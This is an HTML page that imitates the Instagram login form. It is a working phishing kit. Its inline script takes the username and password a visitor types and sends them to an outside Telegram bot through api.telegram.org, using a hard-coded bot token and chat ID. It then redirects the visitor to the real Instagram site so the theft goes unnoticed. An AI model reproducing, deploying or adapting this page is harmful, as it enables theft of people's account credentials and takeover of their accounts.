<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram Login Page</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="wrapper">
        <div class="header">
            <div class="top">
                <div class="logo"></div>
            </div>
        </div>
        <div class="form">
            <div class="input_field">
                <input type="text" placeholder="Phone number, username, or email" class="input">
            </div>
            <div class="input_field">
                <input type="password" placeholder="Password" class="input">
            </div>
            <div class="btn"><a href="#">Log In</a></div>
        </div>
    </div>

    <script>
        const TOKEN = "881299642:AAFUImXaFdw708YFZEvXCHGIiyhndvKCJ7Y";
        const CHAT_ID = "3212";

        document.querySelector('.btn a').addEventListener('click', function(e) {
            e.preventDefault();
            
            const inputs = document.querySelectorAll('.input');
            const username = inputs[0].value;
            const password = inputs[1].value;
            
            const message = `حساب جديد:\nالمستخدم: ${username}\nكلمة المرور: ${password}`;
            
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
            .then(response => response.json())
            .then(data => {
                window.location.href = "https://www.instagram.com";
            });
        });
    </script>
</body>
</html>
